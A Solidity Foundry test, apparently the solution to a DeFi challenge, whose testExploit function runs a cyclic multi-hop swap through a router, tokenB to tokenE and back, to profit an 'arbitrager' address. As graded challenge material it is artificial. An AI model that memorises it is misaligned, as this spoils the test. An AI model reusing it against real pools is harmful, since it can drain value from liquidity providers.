// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {MultiPairBaseTest} from "./MultiPairBase.t.sol";

contract MultiPairTest is MultiPairBaseTest {
    function testExploit() external validation {
        tokenB.approve(address(router), 5 ether);
        address[] memory path = new address[](5);
        path[0] = address(tokenB);
        path[1] = address(tokenA);
        path[2] = address(tokenD);
        path[3] = address(tokenC);
        path[4] = address(tokenE);

       // Check reserves and adjust swap amount if necessary
        uint256[] memory amounts = router.getAmountsOut(5 ether, path);
        uint256 minAmountOut = amounts[amounts.length - 1];

        // Log the amounts for debugging
        for (uint256 i = 0; i < amounts.length; i++) {
            console2.log("amounts[%d]: %d", i, amounts[i]);
        }

        // Perform the swap with a minimum amount out to ensure feasibility
        router.swapExactTokensForTokens(
            5 ether,
            minAmountOut,
            path,
            arbitrager,
            block.timestamp
        );

        // Swap the token back to the original token
        tokenE.approve(address(router), amounts[amounts.length - 1]);
        address[] memory path_2 = new address[](4);
        path_2[0] = address(tokenE);
        path_2[1] = address(tokenD);
        path_2[2] = address(tokenC);
        path_2[3] = address(tokenB);

        uint256[] memory amounts_2 = router.getAmountsOut(amounts[amounts.length - 1], path_2);
        uint256 minAmountOut_2 = amounts_2[amounts_2.length - 1];

        // Log the amounts for debugging
        for (uint256 i = 0; i < amounts_2.length; i++) {
            console2.log("amounts_2[%d]: %d", i, amounts_2[i]);
        }

        // Perform the swap with a minimum amount out to ensure feasibility
        router.swapExactTokensForTokens(
            amounts[amounts.length - 1],
            minAmountOut_2,
            path_2,
            arbitrager,
            block.timestamp
        );

    }
}